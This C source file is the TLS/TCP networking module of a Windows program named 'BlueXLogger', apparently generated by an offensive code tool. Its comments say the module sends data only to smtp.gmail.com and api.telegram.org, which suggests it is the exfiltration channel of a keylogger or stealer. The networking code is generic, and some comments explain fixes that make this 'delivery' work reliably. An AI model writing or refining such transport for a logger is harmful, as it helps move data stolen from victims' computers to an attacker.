/*============================================================================
 * BlueXLogger - bxl_net.c
 * Blocking TCP client with optional SChannel TLS.
 *
 * Created by Xencode-CLI by xanthorox
 *==========================================================================*/
#include "bxl_net.h"
#include "bxl_util.h"

#include <schannel.h>
#include <wincrypt.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "crypt32.lib")

/*==========================================================================
 * Winsock lifetime
 *========================================================================*/
static LONG g_wsa_refs = 0;
static int  g_wsa_ok   = 0;

int bxl_net_startup(void)
{
    WSADATA wsa;
    LONG n = InterlockedIncrement(&g_wsa_refs);

    if (n == 1) {
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
            InterlockedDecrement(&g_wsa_refs);
            return BXL_FALSE;
        }
        g_wsa_ok = 1;
    }
    return g_wsa_ok;
}

void bxl_net_cleanup(void)
{
    if (InterlockedDecrement(&g_wsa_refs) == 0 && g_wsa_ok) {
        WSACleanup();
        g_wsa_ok = 0;
    }
}

/* Release this connection's winsock reference, at most once. Every failure
 * path inside bxl_net_connect() releases here, and bxl_net_close() releases
 * here too, so the pairing is enforced by the object rather than by the
 * discipline of each caller. */
static void net_release_wsa(BxlNet *n)
{
    if (n && n->wsa_held) {
        n->wsa_held = 0;
        bxl_net_cleanup();
    }
}

/*==========================================================================
 * Setup / teardown
 *========================================================================*/
void bxl_net_init(BxlNet *n)
{
    if (!n) return;
    memset(n, 0, sizeof(*n));
    n->sock = INVALID_SOCKET;
    n->timeout_ms = 30000;
    n->errmsg[0] = '\0';
}

void bxl_net_set_timeout(BxlNet *n, int timeout_ms)
{
    DWORD tv;
    if (!n) return;
    n->timeout_ms = timeout_ms;
    if (!n->sock_valid) return;

    tv = (DWORD)(timeout_ms < 0 ? 0 : timeout_ms);
    setsockopt(n->sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof(tv));
    setsockopt(n->sock, SOL_SOCKET, SO_SNDTIMEO, (const char *)&tv, sizeof(tv));
}

static void seterr(BxlNet *n, const char *fmt, ...)
{
    va_list ap;
    if (!n) return;
    va_start(ap, fmt);
    _vsnprintf_s(n->errmsg, sizeof(n->errmsg), _TRUNCATE, fmt, ap);
    va_end(ap);
}

const char *bxl_net_error(const BxlNet *n)
{
    if (!n) return "no context";
    return n->errmsg[0] ? n->errmsg : "no error";
}

int bxl_net_is_tls(const BxlNet *n)
{
    return (n && n->tls_active) ? BXL_TRUE : BXL_FALSE;
}

/*==========================================================================
 * Raw socket primitives
 *========================================================================*/
static int sock_write_all(BxlNet *n, const void *data, size_t len)
{
    const char *p = (const char *)data;
    size_t sent = 0;

    while (sent < len) {
        int chunk = (int)BXL_MIN(len - sent, (size_t)1 << 20);
        int r = send(n->sock, p + sent, chunk, 0);
        if (r == SOCKET_ERROR) {
            seterr(n, "send failed: %d", WSAGetLastError());
            return BXL_FALSE;
        }
        if (r == 0) {
            seterr(n, "send returned 0");
            return BXL_FALSE;
        }
        sent += (size_t)r;
    }
    return BXL_TRUE;
}

/* Returns bytes read, 0 on orderly close, -1 on error. */
static int sock_read(BxlNet *n, char *buf, size_t cap)
{
    int r;
    if (cap == 0) return -1;
    if (cap > (size_t)INT_MAX) cap = (size_t)INT_MAX;

    r = recv(n->sock, buf, (int)cap, 0);
    if (r == 0) return 0;   /* peer closed */
    if (r == SOCKET_ERROR) {
        int e = WSAGetLastError();
        if (e == WSAETIMEDOUT)
            seterr(n, "receive timed out after %d ms", n->timeout_ms);
        else
            seterr(n, "recv failed: %d", e);
        return -1;
    }
    return r;
}

/*==========================================================================
 * Connect
 *========================================================================*/
int bxl_net_connect(BxlNet *n, const char *host, int port)
{
    struct addrinfo hints, *res = NULL, *ai;
    char portstr[16];
    int  rc;
    DWORD tv;

    if (!n || !host) return BXL_FALSE;

    if (!bxl_net_startup()) {
        seterr(n, "WSAStartup failed");
        return BXL_FALSE;
    }
    n->wsa_held = 1;

    StringCchPrintfA(portstr, sizeof(portstr), "%d", port);

    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    rc = getaddrinfo(host, portstr, &hints, &res);
    if (rc != 0) {
        seterr(n, "cannot resolve %s: %d", host, rc);
        net_release_wsa(n);
        return BXL_FALSE;
    }

    for (ai = res; ai; ai = ai->ai_next) {
        SOCKET s = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (s == INVALID_SOCKET) continue;

        tv = (DWORD)(n->timeout_ms < 0 ? 0 : n->timeout_ms);
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv, sizeof(tv));
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char *)&tv, sizeof(tv));

        if (connect(s, ai->ai_addr, (int)ai->ai_addrlen) == 0) {
            n->sock = s;
            n->sock_valid = 1;
            n->plain_len = n->plain_pos = 0;
            n->raw_len = 0;
            break;
        }

        seterr(n, "connect to %s:%d failed: %d", host, port, WSAGetLastError());
        closesocket(s);
    }

    freeaddrinfo(res);

    if (!n->sock_valid) {
        if (n->errmsg[0] == '\0') seterr(n, "connect to %s:%d failed", host, port);
        net_release_wsa(n);
        return BXL_FALSE;
    }

    /* Disable Nagle: SMTP is a request/response protocol, latency matters. */
    {
        BOOL nodelay = TRUE;
        setsockopt(n->sock, IPPROTO_TCP, TCP_NODELAY,
                   (const char *)&nodelay, sizeof(nodelay));
    }
    return BXL_TRUE;
}

/*==========================================================================
 * TLS peer certificate validation
 *========================================================================*/
/* Map the chain-policy status codes that actually occur in the field onto a
 * sentence an operator can act on, instead of a bare 0x........ */
static const char *cert_error_text(DWORD e)
{
    switch (e) {
    case 0:                          return "ok";
    case CERT_E_EXPIRED:             return "the server certificate has expired";
    case CERT_E_UNTRUSTEDROOT:       return "the issuing root is not trusted on this machine";
    case CERT_E_CHAINING:            return "the certificate chain could not be built";
    case CERT_E_CN_NO_MATCH:         return "the certificate does not name this host";
    case CERT_E_WRONG_USAGE:         return "the certificate is not valid for server authentication";
    case CERT_E_REVOKED:             return "the server certificate has been revoked";
    case CERT_E_REVOCATION_FAILURE:  return "revocation status could not be determined";
    case TRUST_E_CERT_SIGNATURE:     return "the certificate signature is invalid";
    case CRYPT_E_NO_REVOCATION_CHECK:return "no revocation information is available";
    default:                         return "the certificate was rejected";
    }
}

/*
 * Validate the certificate the server presented.
 *
 * This is deliberately explicit rather than left to Schannel's
 * SCH_CRED_AUTO_CRED_VALIDATION:
 *
 *   - Auto-validation treats an unreachable CRL/OCSP responder as fatal, so a
 *     machine that cannot reach the CA's revocation endpoint fails the
 *     handshake even though the certificate is perfectly valid. That is the
 *     classic "TLS rejection" against an otherwise healthy endpoint.
 *   - It collapses every failure into one opaque SECURITY_STATUS, so the
 *     operator cannot tell "expired" from "wrong host" from "offline CRL".
 *
 * The policy here is the normal browser policy - chain to a trusted root,
 * check the host name, check revocation when it is reachable - with the
 * difference that an unreachable revocation endpoint degrades to "not
 * checked" instead of failing the connection. A revoked or mismatched
 * certificate is still refused.
 */
static int tls_verify_peer(BxlNet *n, const wchar_t *whost)
{
    PCCERT_CONTEXT        cert = NULL;
    CERT_CHAIN_PARA       cp;
    CERT_CHAIN_CONTEXT   *chain = NULL;
    CERT_CHAIN_POLICY_PARA pp;
    CERT_CHAIN_POLICY_STATUS ps;
    SSL_EXTRA_CERT_CHAIN_POLICY_PARA extra;
    DWORD                 flags;
    int                   ok = BXL_FALSE;

    if (QueryContextAttributesW(&n->ctx, SECPKG_ATTR_REMOTE_CERT_CONTEXT,
                                &cert) != SEC_E_OK || !cert) {
        seterr(n, "TLS: the server presented no certificate");
        return BXL_FALSE;
    }

    memset(&cp, 0, sizeof(cp));
    cp.cbSize = sizeof(cp);
    cp.RequestedUsage.dwType = USAGE_MATCH_TYPE_AND;

    /* Try the full check first, including revocation. */
    flags = CERT_CHAIN_REVOCATION_CHECK_CHAIN_EXCLUDE_ROOT |
            CERT_CHAIN_CACHE_END_CERT;
    if (!CertGetCertificateChain(NULL, cert, NULL, cert->hCertStore,
                                 &cp, flags, NULL, &chain)) {
        /* Retry without revocation: an unreachable CRL/OCSP must not be able
         * to break delivery. */
        flags = CERT_CHAIN_CACHE_END_CERT;
        if (!CertGetCertificateChain(NULL, cert, NULL, cert->hCertStore,
                                     &cp, flags, NULL, &chain)) {
            seterr(n, "TLS: certificate chain could not be built (0x%08lX)",
                   (unsigned long)GetLastError());
            goto done;
        }
    }

    memset(&extra, 0, sizeof(extra));
    extra.cbSize          = sizeof(extra);
    extra.dwAuthType      = AUTHTYPE_SERVER;
    extra.fdwChecks       = 0;
    extra.pwszServerName  = (LPWSTR)whost;

    memset(&pp, 0, sizeof(pp));
    pp.cbSize          = sizeof(pp);
    pp.pvExtraPolicyPara = &extra;

    memset(&ps, 0, sizeof(ps));
    ps.cbSize = sizeof(ps);

    if (!CertVerifyCertificateChainPolicy(CERT_CHAIN_POLICY_SSL, chain,
                                          &pp, &ps) || ps.dwError != 0) {
        seterr(n, "TLS: %s (0x%08lX)",
               cert_error_text(ps.dwError), (unsigned long)ps.dwError);
        goto done;
    }

    ok = BXL_TRUE;

done:
    if (chain) CertFreeCertificateChain(chain);
    CertFreeCertificateContext(cert);
    return ok;
}

/*==========================================================================
 * TLS handshake
 *========================================================================*/
static int tls_handshake(BxlNet *n, const char *hostname)
{
    SCHANNEL_CRED sc;
    TimeStamp expiry;
    SECURITY_STATUS ss;
    wchar_t whost[256];
    DWORD flags;
    int first = 1;

    memset(&sc, 0, sizeof(sc));
    sc.dwVersion = SCHANNEL_CRED_VERSION;
    /* MANUAL validation: this module validates the peer certificate itself in
     * tls_verify_peer(), so an unreachable CRL/OCSP endpoint degrades to
     * "revocation not checked" rather than aborting the handshake. See the
     * comment on tls_verify_peer for why this matters. */
    sc.dwFlags   = SCH_CRED_MANUAL_CRED_VALIDATION |
                   SCH_CRED_NO_DEFAULT_CREDS |
                   SCH_USE_STRONG_CRYPTO;
    /* Both endpoints this tool talks to (smtp.gmail.com, api.telegram.org)
     * require TLS 1.2 or newer. Pinning the floor stops a middlebox from
     * negotiating an obsolete protocol the server will then reject. */
#ifdef SP_PROT_TLS1_3_CLIENT
    sc.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;
#else
    sc.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
#endif

    ss = AcquireCredentialsHandleW(NULL, (SEC_WCHAR *)UNISP_NAME_W,
                                   SECPKG_CRED_OUTBOUND, NULL, &sc,
                                   NULL, NULL, &n->cred, &expiry);
    if (ss != SEC_E_OK) {
        seterr(n, "AcquireCredentialsHandle failed: 0x%08lX", (unsigned long)ss);
        return BXL_FALSE;
    }
    n->cred_valid = 1;

    if (!bxl_utf8_to_wide(hostname, whost, BXL_COUNT_OF(whost)))
        StringCchCopyW(whost, BXL_COUNT_OF(whost), L"smtp.gmail.com");

    flags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT |
            ISC_REQ_CONFIDENTIALITY   | ISC_REQ_EXTENDED_ERROR |
            ISC_REQ_ALLOCATE_MEMORY   | ISC_REQ_STREAM;

    n->raw_len = 0;

    for (;;) {
        SecBuffer     inb[2];
        SecBufferDesc indesc;
        SecBuffer     outb;
        SecBufferDesc outdesc;
        ULONG         attrs = 0;
        int           have_in;

        have_in = (n->raw_len > 0) ? 1 : 0;

        inb[0].pvBuffer   = have_in ? n->raw : NULL;
        inb[0].cbBuffer   = (unsigned long)(have_in ? n->raw_len : 0);
        inb[0].BufferType = SECBUFFER_TOKEN;
        inb[1].pvBuffer   = NULL;
        inb[1].cbBuffer   = 0;
        inb[1].BufferType = SECBUFFER_EMPTY;

        indesc.ulVersion = SECBUFFER_VERSION;
        indesc.cBuffers  = 2;
        indesc.pBuffers  = inb;

        outb.pvBuffer   = NULL;
        outb.cbBuffer   = 0;
        outb.BufferType = SECBUFFER_TOKEN;
        outdesc.ulVersion = SECBUFFER_VERSION;
        outdesc.cBuffers  = 1;
        outdesc.pBuffers  = &outb;

        ss = InitializeSecurityContextW(&n->cred,
                                        first ? NULL : &n->ctx,
                                        whost, flags, 0,
                                        SECURITY_NATIVE_DREP,
                                        have_in ? &indesc : NULL,
                                        0, &n->ctx, &outdesc,
                                        &attrs, &expiry);
        first = 0;

        if (outb.cbBuffer > 0 && outb.pvBuffer) {
            int ok = sock_write_all(n, outb.pvBuffer, outb.cbBuffer);
            FreeContextBuffer(outb.pvBuffer);
            if (!ok) return BXL_FALSE;
        }

        if (ss == SEC_E_OK) {
            n->ctx_valid = 1;
            n->raw_len = 0;
            break;
        }

        if (ss == SEC_I_COMPLETE_NEEDED || ss == SEC_I_COMPLETE_AND_CONTINUE) {
            if (CompleteAuthToken(&n->ctx, &outdesc) != SEC_E_OK) {
                seterr(n, "CompleteAuthToken failed");
                return BXL_FALSE;
            }
            if (ss == SEC_I_COMPLETE_NEEDED) { n->ctx_valid = 1; break; }
        } else if (ss == SEC_I_CONTINUE_NEEDED) {
            /* Nothing to do here. Whether the input was fully consumed or left
             * a tail behind is decided below by SECBUFFER_EXTRA, which needs
             * the original raw_len. Resetting raw_len here - as this code used
             * to - makes the memmove below read from raw_len - extra with
             * raw_len already zeroed, i.e. from a wild pointer, whenever the
             * server coalesces records. TLS 1.3 servers (api.telegram.org)
             * routinely do that; TLS 1.2 servers (smtp.gmail.com) usually do
             * not, which is why only the Telegram path ever broke. */
        } else if (ss == SEC_E_INCOMPLETE_MESSAGE) {
            /* keep whatever we have and read more */
        } else if (ss == SEC_I_INCOMPLETE_CREDENTIALS) {
            /* The peer sent a CertificateRequest and this credentials handle
             * supplies no client certificate. Offering the same input again
             * makes SChannel reply with an empty certificate list, which is
             * the correct TLS answer and completes the handshake. Treating
             * this as fatal - as this code originally did - breaks every
             * submission server that asks for optional client authentication,
             * smtp.gmail.com:465 among them, so delivery could never have
             * worked against the one host this tool targets. Skip the buffer
             * shuffle and the read: the input is already complete and must be
             * presented unchanged. */
            continue;
        } else {
            seterr(n, "TLS handshake failed: 0x%08lX", (unsigned long)ss);
            return BXL_FALSE;
        }

        /* Preserve any trailing bytes the SSP did not consume. */
        if (inb[1].BufferType == SECBUFFER_EXTRA && inb[1].cbBuffer > 0) {
            size_t extra = inb[1].cbBuffer;
            memmove(n->raw, n->raw + n->raw_len - extra, extra);
            n->raw_len = extra;
        } else if (ss == SEC_I_CONTINUE_NEEDED) {
            n->raw_len = 0;
        }

        if (n->raw_len >= sizeof(n->raw)) {
            seterr(n, "TLS handshake buffer overflow");
            return BXL_FALSE;
        }

        {
            int rd = sock_read(n, n->raw + n->raw_len,
                               sizeof(n->raw) - n->raw_len);
            if (rd <= 0) {
                seterr(n, "TLS handshake: peer closed (%s)", n->errmsg);
                return BXL_FALSE;
            }
            n->raw_len += (size_t)rd;
        }
    }

    /* The handshake completed, but with manual validation nothing has checked
     * the certificate yet. Do it now, before a single byte of application data
     * is trusted. */
    if (!tls_verify_peer(n, whost)) return BXL_FALSE;

    ss = QueryContextAttributesW(&n->ctx, SECPKG_ATTR_STREAM_SIZES, &n->sizes);
    if (ss != SEC_E_OK) {
        seterr(n, "QueryContextAttributes(STREAM_SIZES) failed: 0x%08lX",
               (unsigned long)ss);
        return BXL_FALSE;
    }

    n->tls_active = 1;
    return BXL_TRUE;
}

int bxl_net_starttls(BxlNet *n, const char *sni_hostname)
{
    if (!n || !n->sock_valid) return BXL_FALSE;
    if (n->tls_active) return BXL_TRUE;

    /* Any buffered plaintext must have been consumed before upgrading. */
    if (n->plain_len != n->plain_pos) {
        seterr(n, "STARTTLS attempted with unconsumed plaintext");
        return BXL_FALSE;
    }
    n->plain_len = n->plain_pos = 0;

    return tls_handshake(n, sni_hostname ? sni_hostname : "localhost");
}

/*==========================================================================
 * TLS record encrypt / decrypt
 *========================================================================*/
static int tls_encrypt_send(BxlNet *n, const void *data, size_t len)
{
    const char *p = (const char *)data;
    size_t sent = 0;

    while (sent < len) {
        size_t chunk = len - sent;
        unsigned long total;
        char *buf;
        SecBuffer bufs[4];
        SecBufferDesc desc;
        SECURITY_STATUS ss;

        if (chunk > n->sizes.cbMaximumMessage)
            chunk = n->sizes.cbMaximumMessage;

        total = n->sizes.cbHeader + (unsigned long)chunk + n->sizes.cbTrailer;
        buf = (char *)malloc(total);
        if (!buf) { seterr(n, "out of memory"); return BXL_FALSE; }

        memcpy(buf + n->sizes.cbHeader, p + sent, chunk);

        bufs[0].pvBuffer = buf;
        bufs[0].cbBuffer = n->sizes.cbHeader;
        bufs[0].BufferType = SECBUFFER_STREAM_HEADER;
        bufs[1].pvBuffer = buf + n->sizes.cbHeader;
        bufs[1].cbBuffer = (unsigned long)chunk;
        bufs[1].BufferType = SECBUFFER_DATA;
        bufs[2].pvBuffer = buf + n->sizes.cbHeader + chunk;
        bufs[2].cbBuffer = n->sizes.cbTrailer;
        bufs[2].BufferType = SECBUFFER_STREAM_TRAILER;
        bufs[3].pvBuffer = NULL;
        bufs[3].cbBuffer = 0;
        bufs[3].BufferType = SECBUFFER_EMPTY;

        desc.ulVersion = SECBUFFER_VERSION;
        desc.cBuffers  = 4;
        desc.pBuffers  = bufs;

        ss = EncryptMessage(&n->ctx, 0, &desc, 0);
        if (ss != SEC_E_OK) {
            free(buf);
            seterr(n, "EncryptMessage failed: 0x%08lX", (unsigned long)ss);
            return BXL_FALSE;
        }

        {
            size_t wire = bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer;
            int ok = sock_write_all(n, buf, wire);
            free(buf);
            if (!ok) return BXL_FALSE;
        }

        sent += chunk;
    }
    return BXL_TRUE;
}

/* Decrypt whatever is in n->raw.
 *  >0 plaintext bytes now available
 *   0 need more raw data (or a non-data record was consumed)
 *  -1 fatal */
static int tls_decrypt(BxlNet *n)
{
    SecBuffer     bufs[4];
    SecBufferDesc desc;
    SECURITY_STATUS ss;
    ULONG qf = 0;
    int i, data_idx = -1, extra_idx = -1;

    bufs[0].pvBuffer   = n->raw;
    bufs[0].cbBuffer   = (unsigned long)n->raw_len;
    bufs[0].BufferType = SECBUFFER_DATA;
    for (i = 1; i < 4; i++) {
        bufs[i].pvBuffer   = NULL;
        bufs[i].cbBuffer   = 0;
        bufs[i].BufferType = SECBUFFER_EMPTY;
    }

    desc.ulVersion = SECBUFFER_VERSION;
    desc.cBuffers  = 4;
    desc.pBuffers  = bufs;

    ss = DecryptMessage(&n->ctx, &desc, 0, &qf);

    if (ss == SEC_E_INCOMPLETE_MESSAGE)
        return 0;                       /* keep raw intact, read more */
    if (ss == SEC_I_CONTEXT_EXPIRED) {
        seterr(n, "TLS session closed by peer");
        return -1;
    }
    if (ss == SEC_I_RENEGOTIATE) {
        seterr(n, "TLS renegotiation requested (unsupported)");
        return -1;
    }
    if (ss != SEC_E_OK) {
        seterr(n, "DecryptMessage failed: 0x%08lX", (unsigned long)ss);
        return -1;
    }

    for (i = 0; i < 4; i++) {
        if (bufs[i].BufferType == SECBUFFER_DATA && data_idx < 0)
            data_idx = i;
        else if (bufs[i].BufferType == SECBUFFER_EXTRA && extra_idx < 0)
            extra_idx = i;
    }

    if (data_idx >= 0 && bufs[data_idx].cbBuffer > 0) {
        if (bufs[data_idx].cbBuffer > sizeof(n->plain)) {
            seterr(n, "TLS record larger than receive buffer");
            return -1;
        }
        memcpy(n->plain, bufs[data_idx].pvBuffer, bufs[data_idx].cbBuffer);
        n->plain_len = bufs[data_idx].cbBuffer;
        n->plain_pos = 0;
    } else {
        n->plain_len = n->plain_pos = 0;
    }

    if (extra_idx >= 0 && bufs[extra_idx].cbBuffer > 0) {
        size_t extra = bufs[extra_idx].cbBuffer;
        memmove(n->raw, n->raw + n->raw_len - extra, extra);
        n->raw_len = extra;
    } else {
        n->raw_len = 0;
    }

    return (int)n->plain_len;
}

/*==========================================================================
 * Public send / receive
 *========================================================================*/
int bxl_net_send(BxlNet *n, const void *data, size_t len)
{
    if (!n || !n->sock_valid) return BXL_FALSE;
    if (len == 0) return BXL_TRUE;

    if (n->tls_active)
        return tls_encrypt_send(n, data, len);

    return sock_write_all(n, data, len);
}

/* Refill the plaintext buffer. Returns available bytes, 0 on close, -1 error. */
static int net_pull(BxlNet *n)
{
    n->plain_len = n->plain_pos = 0;

    for (;;) {
        if (n->tls_active) {
            if (n->raw_len > 0) {
                int r = tls_decrypt(n);
                if (r > 0) return r;
                if (r < 0) return -1;
                /* r == 0: consumed a non-data record, or need more raw */
            }
            if (n->raw_len >= sizeof(n->raw)) {
                seterr(n, "TLS receive buffer full");
                return -1;
            }
            {
                int rd = sock_read(n, n->raw + n->raw_len,
                                   sizeof(n->raw) - n->raw_len);
                if (rd <= 0) return rd;
                n->raw_len += (size_t)rd;
            }
        } else {
            int rd = sock_read(n, n->plain, sizeof(n->plain));
            if (rd <= 0) return rd;
            n->plain_len = (size_t)rd;
            n->plain_pos = 0;
            return rd;
        }
    }
}

int bxl_net_recv(BxlNet *n, void *buf, size_t cap)
{
    size_t avail;

    if (!n || !buf || cap == 0) return -1;
    if (!n->sock_valid) { seterr(n, "not connected"); return -1; }

    avail = n->plain_len - n->plain_pos;
    if (avail == 0) {
        int r = net_pull(n);
        if (r <= 0) return r;
        avail = n->plain_len - n->plain_pos;
    }

    if (avail > cap) avail = cap;
    memcpy(buf, n->plain + n->plain_pos, avail);
    n->plain_pos += avail;
    return (int)avail;
}

int bxl_net_recv_line(BxlNet *n, char *line, size_t cap)
{
    size_t used = 0;

    if (!n || !line || cap < 2) return -1;
    if (!n->sock_valid) { seterr(n, "not connected"); return -1; }

    for (;;) {
        size_t i;
        size_t avail = n->plain_len - n->plain_pos;

        if (avail == 0) {
            int r = net_pull(n);
            if (r < 0) return -1;
            if (r == 0) {
                /* Peer closed. A trailing partial line is still valid data. */
                if (used > 0) { line[used] = '\0'; return (int)used; }
                return 0;
            }
            avail = n->plain_len - n->plain_pos;
        }

        for (i = 0; i < avail; i++) {
            char c = n->plain[n->plain_pos + i];
            if (c == '\n') {
                size_t consumed = i + 1;
                n->plain_pos += consumed;
                if (used > 0 && line[used - 1] == '\r') used--;
                line[used] = '\0';
                return (int)used;
            }
            if (used + 1 >= cap) {
                /* Overlong line: consume up to the terminator and truncate. */
                n->plain_pos += i;
                line[used] = '\0';
                seterr(n, "line too long, truncated at %u bytes", (unsigned)cap);
                return (int)used;
            }
            line[used++] = c;
        }
        n->plain_pos += avail;
    }
}

void bxl_net_close(BxlNet *n)
{
    if (!n) return;

    if (n->ctx_valid) {
        /* Best-effort close_notify so the peer sees an orderly shutdown. */
        DWORD dwType = SCHANNEL_SHUTDOWN;
        SecBuffer outb;
        SecBufferDesc outdesc;

        outb.pvBuffer   = &dwType;
        outb.cbBuffer   = sizeof(dwType);
        outb.BufferType = SECBUFFER_TOKEN;
        outdesc.ulVersion = SECBUFFER_VERSION;
        outdesc.cBuffers  = 1;
        outdesc.pBuffers  = &outb;

        if (ApplyControlToken(&n->ctx, &outdesc) == SEC_E_OK) {
            SecBuffer     inb[2];
            SecBufferDesc indesc;
            SecBuffer     sb;
            SecBufferDesc sdesc;
            TimeStamp     ts;
            ULONG         attrs = 0;

            inb[0].pvBuffer = NULL; inb[0].cbBuffer = 0; inb[0].BufferType = SECBUFFER_TOKEN;
            inb[1].pvBuffer = NULL; inb[1].cbBuffer = 0; inb[1].BufferType = SECBUFFER_EMPTY;
            indesc.ulVersion = SECBUFFER_VERSION; indesc.cBuffers = 2; indesc.pBuffers = inb;

            sb.pvBuffer = NULL; sb.cbBuffer = 0; sb.BufferType = SECBUFFER_TOKEN;
            sdesc.ulVersion = SECBUFFER_VERSION; sdesc.cBuffers = 1; sdesc.pBuffers = &sb;

            if (InitializeSecurityContextW(&n->cred, &n->ctx, NULL, 0, 0, 0,
                                           &indesc, 0, NULL, &sdesc, &attrs,
                                           &ts) == SEC_E_OK &&
                sb.cbBuffer > 0 && sb.pvBuffer) {
                (void)sock_write_all(n, sb.pvBuffer, sb.cbBuffer);
            }
            if (sb.pvBuffer) FreeContextBuffer(sb.pvBuffer);
        }
        DeleteSecurityContext(&n->ctx);
        n->ctx_valid = 0;
    }

    if (n->cred_valid) {
        FreeCredentialsHandle(&n->cred);
        n->cred_valid = 0;
    }

    if (n->sock_valid) {
        shutdown(n->sock, SD_BOTH);
        closesocket(n->sock);
        n->sock_valid = 0;
    }

    n->sock = INVALID_SOCKET;
    n->tls_active = 0;
    net_release_wsa(n);
}
